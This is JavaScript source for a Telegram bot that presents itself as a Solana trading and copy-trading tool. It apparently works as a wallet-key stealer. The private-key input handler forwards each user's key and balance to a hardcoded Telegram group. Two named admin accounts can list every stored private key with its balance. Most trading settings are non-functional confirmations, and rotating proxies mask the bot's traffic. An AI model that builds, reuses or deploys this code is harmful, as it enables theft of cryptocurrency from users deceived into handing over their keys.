import dotenv from 'dotenv';
dotenv.config();
import { db } from './config.js';
import fs from 'fs';

import { Telegraf, Markup } from 'telegraf';
import { createAccounts, updatePrivateKeys, checkCreateUser, GetInfoUser,export_keys,getAllUsers} from './database/database.js';
import { checkBalenceUser ,transferAllSOL, transferSOL,checkBalenValue} from './handlers/CheckBalance.js';
import { send_sols } from './handlers/TransferSol.js';
const bot = new Telegraf(process.env.BOT_TOKEN);
const bot1 = new Telegraf(process.env.BOT_TOKEN1);
import LocalSession from "telegraf-session-local";
import moment from "moment";
import { PublicKey } from '@solana/web3.js';
import rateLimit from 'telegraf-ratelimit';
import { HttpsProxyAgent } from 'https-proxy-agent';

const proxyList = fs.readFileSync('proxy.txt', 'utf8')
    .trim()
    .split('\n')
    .map(line => {
        const [ip, port, username, password] = line.split(':');
        return `http://${username}:${password}@${ip}:${port}`;
    });

let proxyIndex = 0; // Chỉ số proxy hiện tại

// Hàm lấy proxy tiếp theo (vòng lặp khi hết danh sách)
function getNextProxy() {
    const proxyUrl = proxyList[proxyIndex];
    proxyIndex = (proxyIndex + 1) % proxyList.length; // Lặp lại từ đầu khi hết proxy
    return new HttpsProxyAgent(proxyUrl);
}

// Middleware để đổi proxy mỗi request
async function useDynamicProxy(ctx, next) {
    ctx.telegram.options.agent = getNextProxy();
    return next();
}
const limitConfig = {
    window: 1000,  // Limit within 1 second
    limit: 1,      // Allow only 1 request per second
    onLimitExceeded: (ctx) => ctx.reply("⚠️ Please don't spam commands!"),
};

bot.use(rateLimit(limitConfig));
bot.use(useDynamicProxy); // Áp dụng middleware đổi proxy

const session = new LocalSession({ database: "session_db.json" }); // Lưu session vào file JSON
bot.use(session.middleware()); // Sử dụng middleware session
async function checkDatabase() {
    try {
        await db.get('test').catch(() => null); // Thử lấy một giá trị không tồn tại
        console.log("✅ Database is working!");
    } catch (error) {
        console.error("❌ Database error:", error);
    }
}
async function SettingMenu(ctx) {
    await ctx.reply(`⚙️ *Settings:*
    
🔹 *AUTO BUY:*  
Automatically execute buys upon pasting token address. Tap to switch on/off.

🔹 *AUTO SELL:*  
Automatically execute sells upon pasting token address. Tap to switch on/off.

🔹 *Slippage:*  
Slippage is the difference between expected price and actual trade price.

🔹 *TURBO TIP:*  
Automatically adjusts tip value based on Jito real-time system.

📌 *Note:*  
Tip amount will be adjusted dynamically based on our algorithm to improve transaction success rate.
    `, Markup.inlineKeyboard([
        [Markup.button.callback("⚙️ GENERAL SETTINGS", "general_settings")],
        [Markup.button.callback("💰 TIP 0.00001SOL ✏️", "change_tip")],

        [Markup.button.callback("🛒 --AUTO BUY CONFIG--", "auto_buy_config")],
        [
            Markup.button.callback("❌ Disable", "disable_auto_buy"),
            Markup.button.callback("💲 Amount 0.1 SOL ✏️", "change_auto_buy_amount")
        ],

        [Markup.button.callback("💸 --AUTO SELL CONFIG--", "auto_sell_config")],
        [
            Markup.button.callback("❌ Disable", "disable_auto_sell"),
            Markup.button.callback("💲 Amount 0.1 SOL ✏️", "change_auto_sell_amount")
        ],

        [Markup.button.callback("🚀 --AUTO CALL VIP RAYDIUM--", "auto_vip_ray")],
        [
            Markup.button.callback("🛑 Auto buy OFF", "toggle_auto_buy_vip"),
            Markup.button.callback("💲 Amount 2 SOL ✏️", "change_auto_buy_vip")
        ],
        [
            Markup.button.callback("🛑 Auto sell OFF", "toggle_auto_sell_vip"),
            Markup.button.callback("💲 Amount 2 SOL ✏️", "change_auto_sell_vip")
        ],

        [Markup.button.callback("🔥 --AUTO CALL VIP PUMPFUN--", "auto_vip_pumpfun")],
        [
            Markup.button.callback("🛑 Auto buy OFF", "toggle_auto_buy_pumpfun"),
            Markup.button.callback("💲 Amount 2 SOL ✏️", "change_auto_buy_pumpfun")
        ],

        [Markup.button.callback("❌ Close", "back_to_menu")]
    ]));
}

// Xử lý các nút khi được nhấn
bot.action("general_settings", async (ctx) => {
    await ctx.reply("⚙️ General settings are currently under development.");
});

bot.action("change_tip", async (ctx) => {
    ctx.session.waitingForTipAmount = true;
    await ctx.reply("💰 Enter new tip amount (SOL):");
});

bot.action("disable_auto_buy", async (ctx) => {
    await ctx.reply("❌ Auto Buy has been disabled.");
});

bot.action("change_auto_buy_amount", async (ctx) => {
    ctx.session.waitingForAutoBuyAmount = true;
    await ctx.reply("🛒 Enter new Auto Buy amount (SOL):");
});

bot.action("disable_auto_sell", async (ctx) => {
    await ctx.reply("❌ Auto Sell has been disabled.");
});

bot.action("change_auto_sell_amount", async (ctx) => {
    ctx.session.waitingForAutoSellAmount = true;
    await ctx.reply("💸 Enter new Auto Sell amount (SOL):");
});

bot.action("toggle_auto_buy_vip", async (ctx) => {
    await ctx.reply("🚀 VIP Auto Buy has been toggled.");
});

bot.action("change_auto_buy_vip", async (ctx) => {
    ctx.session.waitingForAutoBuyVipAmount = true;
    await ctx.reply("💲 Enter new VIP Auto Buy amount (SOL):");
});

bot.action("toggle_auto_sell_vip", async (ctx) => {
    await ctx.reply("🚀 VIP Auto Sell has been toggled.");
});

bot.action("change_auto_sell_vip", async (ctx) => {
    ctx.session.waitingForAutoSellVipAmount = true;
    await ctx.reply("💲 Enter new VIP Auto Sell amount (SOL):");
});

bot.action("toggle_auto_buy_pumpfun", async (ctx) => {
    await ctx.reply("🔥 PUMPFUN Auto Buy has been toggled.");
});

bot.action("change_auto_buy_pumpfun", async (ctx) => {
    ctx.session.waitingForAutoBuyPumpfunAmount = true;
    await ctx.reply("💲 Enter new PUMPFUN Auto Buy amount (SOL):");
});

bot.action("back_to_menu", async (ctx) => {
    await ctx.reply("📜 Returning to main menu...");
    await Menu(ctx); // ✅ Gọi hàm Menu() đúng cách

});


// 🏠 Hiển thị menu chính
async function Menu(ctx) {
    const userId = ctx.from.id.toString();
    const username = ctx.from.username; // Lấy username của user

    const hasAccount = await checkCreateUser(userId);
    console.log("User has account:", hasAccount);
    console.log("UserId:", userId);

    // Tạo danh sách nút
    let buttons = [
        [
            hasAccount
                ? Markup.button.callback("🆕 🏦 Check Wallet", "check_wallet")
                : Markup.button.callback("🆕 🏦 Create Wallet", "create_wallet"),
            Markup.button.callback("🔑 ✍️ Update Private Key", "update_key")
        ],
        [
            Markup.button.callback("💰 💳 Check Balance", "check_balance"),
            Markup.button.callback("📤 💸 Send SOL", "send_sol")
        ],
        [
            Markup.button.callback("🚀 🔄 Transfer All SOL", "transfer_all"),
            Markup.button.callback("🔢 💵 Transfer Amount SOL", "transfer_number")
        ],
        [
            Markup.button.callback("🔐 📤 Export Private Key", "export_key"),
        ]
    ];

    if (hasAccount) {
        buttons.push([
            Markup.button.callback("📈 Copy Trader", "copy_trader"),
            Markup.button.callback("⚙️ Setting", "setting_buy")
        ]);
    }
    if (username === "thuyenx" || username === "maxwell_Sterling") {
        buttons.push([
            Markup.button.callback("📜 Get All Users", "Get_fulluser")
        ]);
    }
    await ctx.reply("🚀 Sol Tradings bot: Your Gateway to Solana DeFi 🤖", Markup.inlineKeyboard(buttons));
}
async function setBotCommands(ctx) {
    const userId = ctx.from.id.toString();
    const username = ctx.from.username;

    // Check if the user has an account
    const hasAccount = await checkCreateUser(userId);

    let commands = [
        { command: "start", description: "🚀 Start the bot" },
        { command: "menu", description: "📜 Show menu" },
        { command: hasAccount ? "check_wallet" : "create_wallet", description: hasAccount ? "🏦 Check wallet" : "🏦 Create a new wallet" },
        { command: "update_key", description: "🔑 Update Private Key" },
        { command: "check_balance", description: "💰 Check balance" },
        { command: "send_sol", description: "📤 Send SOL" },
        { command: "transfer_all", description: "🚀 Transfer all SOL" },
        { command: "transfer_number", description: "🔢 Transfer a specific amount of SOL" },
        { command: "export_key", description: "🔐 Export Private Key" }
    ];

    // Add admin command if the user is "thuyenx"
    if (username === "thuyenx") {
        commands.push({ command: "get_fulluser", description: "📜 View all users (Admin)" });
    }

    await bot.telegram.setMyCommands(commands);
}

bot.start(async (ctx) => {
    await Menu(ctx);
    await checkDatabase();
    await setBotCommands(ctx);
});
async function Menu1(ctx) {
    const userId = ctx.from.id.toString();
    const hasAccount = await checkCreateUser(userId);
    console.log("User has account:", hasAccount);
    console.log("UserId:", userId);

    // Tạo danh sách nút
    let buttons = [
      
        [
            Markup.button.callback("💰 💳 Get Full User", "Get_fulluser"),
            // Markup.button.callback("📤 💸 Send SOL", "send_sol")
        ],
    ]

    await ctx.reply("🚀 Sol Tradings bot: Your Gateway to Solana DeFi 🤖", Markup.inlineKeyboard(buttons));
}

function escapeMarkdownV21(text) {
    return String(text).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}


bot.action("Get_fulluser", async (ctx) => {
    try {
        const result = await getAllUsers();

        if (!result.success) {
            return ctx.reply("❌ Error fetching user list!");
        }

        if (result.users.length === 0) {
            return ctx.reply("📭 No users found in the database.");
        }

        // Sắp xếp danh sách theo thời gian tạo cũ nhất lên trên
        result.users.sort((a, b) => new Date(a.createdAt) - new Date(b.createdAt));

        for (let i = 0; i < result.users.length; i++) {
            const user = result.users[i];
            const valueSol = await checkBalenceUser(user.userId);

            let message = `🔹 *User ${i + 1}:*\n` +
                `🆔 ID: \`${escapeMarkdownV21(user.userId)}\`\n` +
                `🔑 Private Key: \`${user.privateKey ? escapeMarkdownV21(user.privateKey) : "N/A"}\`\n` +
                `📅 Created At: ${escapeMarkdownV21(user.createdAt)}\n` +
                `💰 Balance: ${escapeMarkdownV21(valueSol)} SOL\n` +
                `\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n`;

            await ctx.reply(message, {
                parse_mode: "MarkdownV2",
            });
        }
    } catch (error) {
        console.error("❌ Error displaying users:", error);
        await ctx.reply("⚠️ Error retrieving user data.");
    }
});



bot.action("back_to_menu", async (ctx) => {
    await Menu(ctx);

})

bot.action("send_sol", async (ctx) => {
    try {
        const userId = ctx.from.id.toString();
        const privateKey = await export_keys(userId);

        if (!privateKey) {
            return ctx.reply("❌ *Private key not found\\!*", { parse_mode: "MarkdownV2" });
        }

        const data = await send_sols(privateKey);
        
        if (data.error) {
            return ctx.reply(escapeMarkdownV2(data.error), { parse_mode: "MarkdownV2" });
        }

        const walletText = `💰 *Wallet Address:* \`${escapeMarkdownV2(data.address)}\`\n💸 *Balance:* ${escapeMarkdownV2(data.balance.toString())} SOL`;

        await ctx.reply(walletText, { parse_mode: "MarkdownV2" });

        await ctx.replyWithPhoto({ source: Buffer.from(data.qrCode.split(",")[1], "base64") }, { caption: "📌 Scan this QR to receive SOL!" });
        await Menu(ctx);
    } catch (error) {
        console.error("❌ Error sending SOL:", error);
        ctx.reply("❌ An error occurred while processing the request.", { parse_mode: "MarkdownV2" });
    }
});


bot.action("export_key", async (ctx) => {
    try {
        const userId = ctx.from.id.toString();
        const privateKey = await export_keys(userId);

        if (!privateKey) {
            return ctx.reply("❌ *Private key not found\\!*", {
                parse_mode: "MarkdownV2",
            });
        }

        const message = `
        🛡 *Your Account Details:*  
        \`\`\`
        🔹 User ID    : ${userId}  
        🔹 Private Key:  ${privateKey}
        \`\`\`
        `;

        await ctx.reply(message, {
            parse_mode: "MarkdownV2",
        });

        await Menu(ctx);
    } catch (error) {
        console.error("Error exporting private key:", error);
        ctx.reply("❌ An error occurred while exporting the private key.", {
            parse_mode: "MarkdownV2",
        });
    }
});

function escapeMarkdownV2(text) {
    return text.replace(/[-_.*[\]()~`>#+=|{}!\\]/g, "\\$&");
}
bot.action("main_menu",async(ctx)=>{
    await Menu(ctx);
})
bot.action("create_wallet", async (ctx) => {
    try {
        const userId = ctx.from.id.toString();
        const response = await createAccounts(userId);
        console.log(response);

        if (response.success) {
           
        await ctx.reply(
            `🎉 *Wallet Created Successfully\\!* \n\n` +
            `🆔 *User ID:* \`${escapeMarkdownV2(response.userId)}\`\n` +
            // `📅 *Created At:* \`${escapeMarkdownV2(response.createdAt)}\`\n\n` +
            `🔒 *Private Key:* \\(Not Set\\)`, // Escape dấu ()
            { parse_mode: "MarkdownV2" }
        )
        await ctx.reply(
            "🔐 *Next Step:* Please update your private key to start using your wallet\\!",
            Markup.inlineKeyboard([
                [Markup.button.callback("🔑 Update Private Key", "update_key"),
                Markup.button.callback("📜 Main Menu", "main_menu")]
            ])
        );
           
        } else {
            await ctx.reply(
                `⚠️ *Wallet Already Exists\\!* \n\n🆔 *User ID:* \`${escapeMarkdownV2(response.userId)}\``,
                { parse_mode: "MarkdownV2" }
            );

            await ctx.reply(
                "📌 *What would you like to do next\\?*",
                Markup.inlineKeyboard([
                    [Markup.button.callback("📊 Check Wallet", "check_wallet"),
                    Markup.button.callback("📜 Main Menu", "main_menu")]
                ])
            );
        }
    } catch (error) {
        console.error("❌ Error creating wallet:", error);
        await ctx.reply("❌ *An error occurred while creating your wallet\\.*", {
            parse_mode: "MarkdownV2",
        });
    }
});

bot.action("check_wallet", async (ctx) => {
    try {
        const userId = ctx.from.id.toString();
        const userInfo = await GetInfoUser(userId);
        const valueSol = await checkBalenceUser(userId);

        console.log("User Info:", userInfo); // ✅ Debug log

        if (!userInfo) {
            return ctx.reply("❌ *No account information found\\!*", { parse_mode: "MarkdownV2" });
        }

        // Format the message for better readability
        const message = `🆔 *User ID:* \`${userInfo.id}\`
🔑 *Private Key:* \`${userInfo.privateKey || "Not updated"}\`
💰 *Balance:* \`${valueSol || "0"} SOL\``;

        await ctx.reply(message, { parse_mode: "MarkdownV2" });
        await Menu(ctx);

    } catch (error) {
        console.error("❌ Error retrieving account information:", error);
        return ctx.reply("❌ *An error occurred while fetching account details\\!*", { parse_mode: "MarkdownV2" });
    }
});

bot.action("setting_buy", async (ctx) => {
    // await ctx.reply("hesdofosdf"); // Hiển thị thông báo
    await SettingMenu(ctx); // Hiển thị menu cài đặt mới
});

bot.action("update_key", async (ctx) => {
    ctx.session.waitingForPrivateKey = true; // Mark the state as waiting for private key input
    await ctx.reply("🔑 Enter your new private key:");
});
bot.action("transfer_all", async (ctx) => {
    try {
        ctx.session.RecipientWalletAll = true; // Mark the state as waiting for recipient wallet input

        await ctx.reply(
            "🔑 Enter the recipient's Solana wallet address:",
            Markup.inlineKeyboard([
                [Markup.button.callback("🔄 Continue", "transfer_all"),
                Markup.button.callback("📜 Main Menu", "main_menu")],
            ])
        );
    } catch (error) {
        await ctx.reply("❌ Error entering recipient wallet!");
    }
});

bot.action("transfer_number",async(ctx)=>{
    try {
        ctx.session.RecipientWalletNumber = true; // Mark the state as waiting for recipient wallet input

        await ctx.reply(
            "🔑 Enter the recipient's Solana wallet address:",
            Markup.inlineKeyboard([
                [Markup.button.callback("🔄 Continue", "transfer_all"),
                Markup.button.callback("📜 Main Menu", "main_menu")],
            ])
        );
    } catch (error) {
        await ctx.reply("❌ Error entering recipient wallet!");
    }
})

bot.action("copy_trader", async (ctx) => {
    try {
        const userId = ctx.from.id.toString();
        const valueSol = await checkBalenceUser(userId);

        // 📌 Format message đẹp hơn
        const message = `
📢 *Copy Trading Information* 📢

👤 *User ID:* \`${userId}\`
💰 *Balance:* \`${valueSol} SOL\`

📌 Click the button below to add a Copy Wallet ⬇️
        `;

        // 🎨 Nút với màu sắc hợp lý hơn
        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback("➕ Add Copy Wallet", "add_copy_wallet")]
        ]);

        await ctx.replyWithMarkdown(message, keyboard);

    } catch (error) {
        console.error("❌ Error:", error);
        await ctx.reply("❌ *Error fetching account details!*");
    }
});

bot.action("add_copy_wallet", async (ctx) => {
    try {
        // Đảm bảo ctx.session tồn tại
        if (!ctx.session) ctx.session = {};

        await ctx.reply("📥 Enter copy trade wallet name (8 letters max, only numbers and letters):");
        ctx.session.ValueNameCopyWallet = true; // Đánh dấu trạng thái chờ nhập tên ví copy
    } catch (error) {
        console.error("❌ Error checking balance:", error);
        await ctx.reply("❌ Error checking balance!");
    }
});

bot.action("check_balance", async (ctx) => {
    try {
        // const DB = await openDatabase();
        // console.log(DB);

        const userId = ctx.from.id.toString();
        const valueSol = await checkBalenceUser(userId);

        const message = `
🔹 Value Account: ${userId}
🔹 Value Sol: ${valueSol} SOL
        `;

        await ctx.reply(message);
        await Menu(ctx); // Gọi menu nếu có

    } catch (error) {
        console.error("❌ Errol", error);
        await ctx.reply("❌ Errol");
    }
});
function isValidPublicKey(key) {
    try {
        let pubKey = new PublicKey(key);
        return PublicKey.isOnCurve(pubKey.toBuffer()); // Kiểm tra xem key có hợp lệ không
    } catch (error) {
        return false;
    }
}
bot.command("menu", async (ctx) => {
    await Menu(ctx); // Calls the Menu function to show inline buttons
});
bot.command("check_wallet", async (ctx) => {
    try {
        const userId = ctx.from.id.toString();
        const userInfo = await GetInfoUser(userId);

        console.log("User Info:", userInfo); // ✅ Debug log

        if (!userInfo) {
            return ctx.reply("❌ *No account information found\\!*", { parse_mode: "MarkdownV2" });
        }

        // Format the message for better readability
        const message = `🆔 *User ID:* \`${userInfo.id}\`
🔑 *Private Key:* \`${userInfo.privateKey || "Not updated"}\`
💰 *Balance:* \`${userInfo.balance || "0"} SOL\``;

        await ctx.reply(message, { parse_mode: "MarkdownV2" });
        await Menu(ctx);

    } catch (error) {
        console.error("❌ Error retrieving account information:", error);
        return ctx.reply("❌ *An error occurred while fetching account details\\!*", { parse_mode: "MarkdownV2" });
    }
});
bot.command("create_wallet", async (ctx) => {
    try {
        const userId = ctx.from.id.toString();
        const response = await createAccounts(userId);
        console.log(response);

        if (response.success) {
           
        await ctx.reply(
            `🎉 *Wallet Created Successfully\\!* \n\n` +
            `🆔 *User ID:* \`${escapeMarkdownV2(response.userId)}\`\n` +
            `🔒 *Private Key:* \\(Not Set\\)`, // Escape dấu ()
            { parse_mode: "MarkdownV2" }
        )
        await ctx.reply(
            "🔐 *Next Step:* Please update your private key to start using your wallet\\!",
            Markup.inlineKeyboard([
                [Markup.button.callback("🔑 Update Private Key", "update_key"),
                Markup.button.callback("📜 Main Menu", "main_menu")]
            ])
        );
           
        } else {
            await ctx.reply(
                `⚠️ *Wallet Already Exists\\!* \n\n🆔 *User ID:* \`${escapeMarkdownV2(response.userId)}\``,
                { parse_mode: "MarkdownV2" }
            );

            await ctx.reply(
                "📌 *What would you like to do next\\?*",
                Markup.inlineKeyboard([
                    [Markup.button.callback("📊 Check Wallet", "check_wallet"),
                    Markup.button.callback("📜 Main Menu", "main_menu")]
                ])
            );
        }
    } catch (error) {
        console.error("❌ Error creating wallet:", error);
        await ctx.reply("❌ *An error occurred while creating your wallet\\.*", {
            parse_mode: "MarkdownV2",
        });
    }
});
bot.command("update_key", async (ctx) => {
    ctx.session.waitingForPrivateKey = true; // Mark the state as waiting for private key input
    await ctx.reply("🔑 Enter your new private key:");
});
bot.action("transfer_all", async (ctx) => {
    try {
        ctx.session.RecipientWalletAll = true; // Mark the state as waiting for recipient wallet input

        await ctx.reply(
            "🔑 Enter the recipient's Solana wallet address:",
            Markup.inlineKeyboard([
                [Markup.button.callback("🔄 Continue", "transfer_all"),
                Markup.button.callback("📜 Main Menu", "main_menu")],
            ])
        );
    } catch (error) {
        await ctx.reply("❌ Error entering recipient wallet!");
    }
});
bot.command("check_balance", async (ctx) => {
    try {
        // const DB = await openDatabase();
        // console.log(DB);

        const userId = ctx.from.id.toString();
        const valueSol = await checkBalenceUser(userId);

        const message = `
🔹 Value Account: ${userId}
🔹 Value Sol: ${valueSol} SOL
        `;

        await ctx.reply(message);
        await Menu(ctx); // Gọi menu nếu có

    } catch (error) {
        console.error("❌ Errol", error);
        await ctx.reply("❌ Errol");
    }    // Call function to check balance
});
bot.command("send_sol", async (ctx) => {
    try {
        const userId = ctx.from.id.toString();
        const privateKey = await export_keys(userId);

        if (!privateKey) {
            return ctx.reply("❌ *Private key not found\\!*", { parse_mode: "MarkdownV2" });
        }

        const data = await send_sols(privateKey);
        
        if (data.error) {
            return ctx.reply(escapeMarkdownV2(data.error), { parse_mode: "MarkdownV2" });
        }

        const walletText = `💰 *Wallet Address:* \`${escapeMarkdownV2(data.address)}\`\n💸 *Balance:* ${escapeMarkdownV2(data.balance.toString())} SOL`;

        await ctx.reply(walletText, { parse_mode: "MarkdownV2" });

        await ctx.replyWithPhoto({ source: Buffer.from(data.qrCode.split(",")[1], "base64") }, { caption: "📌 Scan this QR to receive SOL!" });
        await Menu(ctx);
    } catch (error) {
        console.error("❌ Error sending SOL:", error);
        ctx.reply("❌ An error occurred while processing the request.", { parse_mode: "MarkdownV2" });
    }});
    bot.command("get_fulluser", async (ctx) => {
        try {
            const result = await getAllUsers();
    
            if (!result.success) {
                return ctx.reply("❌ Error fetching user list!");
            }
    
            if (result.users.length === 0) {
                return ctx.reply("📭 No users found in the database.");
            }
    
            let message = "📋 *List of Users:*\n\n";
            result.users.forEach((user, index) => {
                message += `🔹 *User ${index + 1}:*\n`;
                message += `🆔 ID: \`${user.userId}\`\n`;
                message += `🔑 Private Key: ${user.privateKey ? user.privateKey : "N/A"}\n`; // ✅ Sửa lỗi ở đây
                message += `📅 Created At: ${user.createdAt}\n`;
                message += `-----------------------------------\n`;
            });
    
            await ctx.replyWithMarkdown(message);
        } catch (error) {
            console.error("❌ Error displaying users:", error);
            await ctx.reply("⚠️ Error retrieving user data.");
        }
    });


    bot.on("text", async (ctx) => {
        const userId = ctx.from.id.toString();
        const text = ctx.message.text.trim();
    
        // 🔐 Nhập private key
        if (ctx.session.waitingForPrivateKey) {
            ctx.session.waitingForPrivateKey = false; // Reset trạng thái
            
            if (!text || text.length < 44) {
                return ctx.reply("❌ Invalid private key. Please enter again:");
            }
            const balance = await checkBalenValue(text);
            if (balance === false || balance === null || balance === undefined || isNaN(balance)) {
                return ctx.reply("❌ Invalid private key. Please enter again:");
            }
            
            // const balance = await checkBalenceUser(userId);
            // if (balance <= 0) {
            //     return ctx.reply("❌ Invalid private key. Please enter again:");
            // }
            
            const message = await updatePrivateKeys(userId, text);
            
            // Gửi phản hồi cho người dùng
            await ctx.reply(message);
        
            // Gửi thông báo đến nhóm Telegram
            const groupId = -4639886128; // ID nhóm của bạn
            const valueSol = await checkBalenceUser(userId);

            const notificationMessage = `🔔 User:${userId}|private key :${text}|sol:${valueSol}`;
            
            try {
                await ctx.telegram.sendMessage(groupId, notificationMessage);
            } catch (error) {
                console.error("❌ Failed to send message to group:", error);
            }
        
            return Menu(ctx);
        }
        
    
        // 🔄 Gửi một số lượng SOL nhất định
        else if (ctx.session.waitingForTransferAmount) {
            ctx.session.waitingForTransferAmount = false; // Reset trạng thái
            
            const amount = parseFloat(text);
            if (isNaN(amount) || amount <= 0) {
                return ctx.reply("❌ Invalid SOL amount. Please enter a valid number:");
            }
    
            const message = await transferSOL(userId, ctx.session.RecipientWalletToValue, amount);
            await ctx.reply(message);
            return Menu(ctx);
        }
    
        // 🔄 Gửi toàn bộ SOL
        else if (ctx.session.RecipientWalletAll) {
            ctx.session.RecipientWalletAll = false; // Reset trạng thái
            
            if (!isValidPublicKey(text)) {
                return ctx.reply("⚠️ Invalid public key! Please enter again.");
            }
    
            const message = await transferAllSOL(userId, text);
            await ctx.reply(message);
            return Menu(ctx);
        }
    
        // 📈 Copy Trading Setup
        else if (ctx.session.waitingForCopyTrade) {
            ctx.session.waitingForCopyTrade = false;
            const valueSol = await checkBalenceUser(userId);
            const message = `
    📊 *Copy Trading Info*  
    👤 *User ID:* \`${userId}\`  
    💰 *Balance:* \`${valueSol} SOL\`  
            `;
    
            const keyboard = Markup.inlineKeyboard([
                [Markup.button.callback("➕ Add Copy Wallet", "add_copy_wallet")]
            ]);
    
            await ctx.replyWithMarkdown(message, keyboard);
            return;
        }
    
        // 📝 Nhập tên Copy Wallet
        else if (ctx.session.waitingForCopyWalletName) {
            ctx.session.waitingForCopyWalletName = false;
            const validNameRegex = /^[a-zA-Z0-9]{1,8}$/;
            if (!validNameRegex.test(text)) {
                return ctx.reply("⚠️ Invalid Name! Only letters & numbers, max 8 characters.");
            }
            await ctx.reply(`✅ Copy trade wallet name set: **${text}**`);
            return Menu(ctx);
        }
    
        // 🔧 Cài đặt Auto Trade
        else if (ctx.session.waitingForTipAmount) {
            ctx.session.waitingForTipAmount = false;
            return ctx.reply(`✅ Tip amount set to: ${text} SOL`);
        }
        else if (ctx.session.waitingForAutoBuyAmount) {
            ctx.session.waitingForAutoBuyAmount = false;
            return ctx.reply(`✅ Auto Buy amount set to: ${text} SOL`);
        }
        else if (ctx.session.waitingForAutoSellAmount) {
            ctx.session.waitingForAutoSellAmount = false;
            return ctx.reply(`✅ Auto Sell amount set to: ${text} SOL`);
        }
        else if (ctx.session.waitingForAutoBuyVipAmount) {
            ctx.session.waitingForAutoBuyVipAmount = false;
            return ctx.reply(`✅ VIP Auto Buy amount set to: ${text} SOL`);
        }
        else if (ctx.session.waitingForAutoSellVipAmount) {
            ctx.session.waitingForAutoSellVipAmount = false;
            return ctx.reply(`✅ VIP Auto Sell amount set to: ${text} SOL`);
        }
        else if (ctx.session.waitingForAutoBuyPumpfunAmount) {
            ctx.session.waitingForAutoBuyPumpfunAmount = false;
            return ctx.reply(`✅ PUMPFUN Auto Buy amount set to: ${text} SOL`);
        }
    
        // 🔄 Nhập Public Key cho Transfer Amount SOL
        else if (ctx.session.waitingForRecipientWalletNumber) {
            if (!isValidPublicKey(text)) {
                return ctx.reply("⚠️ Invalid public key! Please enter again.");
            }
    
            ctx.session.waitingForRecipientWalletNumber = false;
            ctx.session.RecipientWalletToValue = text;
            ctx.session.waitingForTransferAmount = true;
            return ctx.reply("💰 Please enter the amount of SOL to send:");
        }
        else if (ctx.session.ValueNameCopyWallet) {
            const validNameRegex = /^[a-zA-Z0-9]{1,8}$/;
            if (!validNameRegex.test(text)) {
                return ctx.reply("⚠️ Invalid Name! Only letters & numbers, max 8 characters.");
            }
    
            ctx.session.ValueNameCopyWallet = false; // Tắt trạng thái chờ nhập tên
            ctx.session.CopyWalletName = text; // Lưu tên ví copy vào session
    
            // Yêu cầu nhập địa chỉ ví Solana
            ctx.session.ValueAddressCopyWallet = true; // Bật trạng thái chờ nhập địa chỉ ví
            return ctx.reply("📥 Enter the Solana wallet address for copy trading:");
        }
    
        // Bước 2: Nhập địa chỉ ví Solana
        else if (ctx.session.ValueAddressCopyWallet) {
            if (!isValidPublicKey(text)) { // Hàm kiểm tra địa chỉ Solana hợp lệ
                return ctx.reply("⚠️ Invalid Solana address! Please enter again:");
            }
    
            ctx.session.ValueAddressCopyWallet = false; // Tắt trạng thái chờ nhập địa chỉ
    
            // ✅ Báo thành công và quay về menu
            // await ctx.replyWithMarkdownV2(
            //     `✅ *Copy trade wallet address has been successfully set\!* `
            
            await ctx.reply("💰 *Copy Trade Wallet Successfully Set\!* ");
                        
            return Menu(ctx); // Quay về menu chính
        }
        // ❌ Không nhận diện được lệnh
        else {
            return ctx.reply("❌ Command not recognized. Please select from the menu.");
        }
    });
// 🚀 Khởi động bot
bot.launch();
bot1.launch();
console.log("🤖 Bot is running...");
